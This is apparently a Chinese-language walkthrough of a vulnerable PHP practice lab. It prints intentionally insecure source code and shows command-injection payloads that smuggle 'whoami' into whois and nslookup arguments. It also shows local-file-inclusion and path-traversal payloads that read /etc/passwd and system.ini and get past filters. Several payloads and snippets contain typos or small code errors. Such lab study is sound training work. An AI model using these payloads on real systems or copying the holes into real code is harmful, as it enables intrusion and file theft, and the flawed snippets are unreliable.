CMD-1

查看源代码：

```
<?php
    system($_GET["cmd"]);
 ?>
```

这个没有任何过滤，直接命令执行即可。payload：

```
?cmd=whoani
```

CMD-2

这题和上面一样，只不过改成了`POST`请求。

CMD-3

查看源码：

```
<?php
    system("/usr/bin/whois " . $_GET["domain"]);
?>
```

因为测试环境实在`windows`下，所以先把源码中路径改为`nslookup`。

这里需要退出`nsookup`命令，知识点：

> - cmd1|cmd2:不论`cmd1`是否为真，`cmd2`都会被执行；
> - cmd1;cmd2：不论`cmd1`是否为真，`cmd2`都会被执行；
> - cmd1||cmd2：如果`cmd1`为假，则执行`cmd2`；
> - cmd1&&cmd2：如果`cmd1`为真，则执行`cmd2`；

所以构造payload：

```
domain=google.com|whoami
```

CMD-4

方法差不多，只是变成了`POST`请求。

CMD-5

查看源码：

```
<?php
if (preg_match('/^[-a-z0-9]+.a[cdefgilmnoqrstuwxz]|b[abdefghijmnorstvwyz]|c[acdfghiklmnoruvxyz]|d[ejkmoz]|e[cegrstu]|f[ijkmor]|g[abdefghilmnpqrstuwy]|h[kmnrtu]|i[delmnoqrst]|j[emop]|k[eghimnprwyz]|l[abcikrstuvy]|m[acdeghklmnopqrstuvwxyz]|n[acefgilopruz]|om|p[aefghklmnrstwy]|qa|r[eosuw]|s[abcdeghijklmnortuvyz]|t[cdfghjklmnoprtvwz]|u[agksyz]|v[aceginu]|w[fs]|y[et]|z[amw]|biz|cat|com|edu|gov|int|mil|net|org|pro|tel|aero|arpa|asia|coop|info|jobs|mobi|name|museum|travel|arpa|xn--[a-z0-9]+$/', strtolower($_GET["domain"])))
        { system("whois -h " . $_GET["server"] . " " . $_GET["domain"]); } 
    else 
        {echo "malformed domain name";}
    
 ?>
```

这里对`domain`进行了一大堆过滤，但是却没有对`server`进行过滤，所以直接对`server`进行构造。  
域名查询语句：

```
whois -h [server] [domain]
```

payload:

```
domain=facebook.com&server=127.0.0.1|whoami||
```

最后的拼接语句为：

```
whois -h 127.0.0.1|whoami|| facebook.com
```

这里就执行`whoami`，`facebook.com`也被忽略了。

CMD-6

方法和上题一样，改成了`POST`请求。

LFI-1

查看源码：

```
<?php
include($_GET["page"]);
?>
```

这里没有过滤，且包含一个用户输入了的文件。payload：

```
page=C:/Windows/system.ini(windows)
age=/etc/passwd(Linux)
```

LFI-2

查看源码：

```
<?php
include("includes/".$_GET['library'].".php"); 
?>
```

这里添加了要包含文件的上级路径。这里补充一个小知识点：

> ../的意思是返回上次目录

所以我们要跳出`includes`，那么就可以使用`../`跳出。payload:

```
library=../../../zx
```

这里可以使用%00截断，也可以不使用，根据包含文件的类型判断。

LFI-3

查看源码：

```
<?php
if (substr($_GET['file'], -4, 4) != '.php')
 echo file_get_contents($_GET['file']);
else
 echo 'You are not allowed to see source files!'."
";
?>
```

这里使用了`substr()`函数对传入的值进行截取判断，最后四位不能是`.php`。

这里绕过的方法有很多种：

1. 大小写绕过
2. 背后加'.'
3. 背后加空格
4. 背后加'/.'
5. 使用'.ph<'进行`.php`拓展过滤渗出

LFI-4

查看源码：

```
<?php
include('includes/class_'.addslashes($_GET['class']).'.php');
?>
```

这里的`addslash()`会对预定义字符进行转义：

1. 单引号
2. 双引号
3. 反斜杠
4. 0x00  
    也就是说不能使用00截断(貌似也不需要？)，payload和LFI-2一样，不过返回的上级目录会多一点。

LFI-5

查看源码：

```
<?php
   $file = str_replace('../', '', $_GET['file']);
   if(isset($file))
   {
       include("pages/$file");
   }
   else
   {
       include("index.php");
   }
?>
```

这里使用了`str_replace()`对`../`进行了过滤，也就是说无法返回上级目录了，但是因为相当于删除操作，所以可以使用双写的方式进行绕过。payload:

```
file=..././..././..././zx.php
```

LFI-6-10

这几道题就是之前五道题的`POST`方式。

LFI-11

查看源码：

```
<form action="/LFI-11/index.php" method="POST">
    <input type="text" name="file">
    <input type="hidden" name="style" name="stylepath">
</form>

<?php include($_POST['stylepath']); ?>
```

这里用`POST`提交参数，但是不是通过文本框中提交，真正的用`hidden`隐藏起来了。所以我们需要通过火狐/burp进行`POST`请求。

LFI-12

这题和上题一样，只不过是`GET`方式。

LFI-13

不知道为什么和LFI-5一样。

LFI-14

和上题一样，改成`POST`请求。

HDR-1

查看源码：

```
<?php
$template = 'blue.php';
if ( array_key_exists( $_COOKIE['TEMPLATE'] ) )
   $template = $_COOKIE['TEMPLATE'];
include ( dirname(FILE) . "/" . $template );
?>
```

`array_key_exists(key,array)`:检查某个数组中是否存在指定的键名，如果键名存在则返回 true，如果键名不存在则返回 false。如果指定数组的时候省略了键名，将会生成从 0 开始并且每个键值对应以 1 递增的整数键名。

`dirname(path)`:返回路径中的目录部分。

这道题在`Cookie`中传值，可以通过返回上级目录的方式进行包含。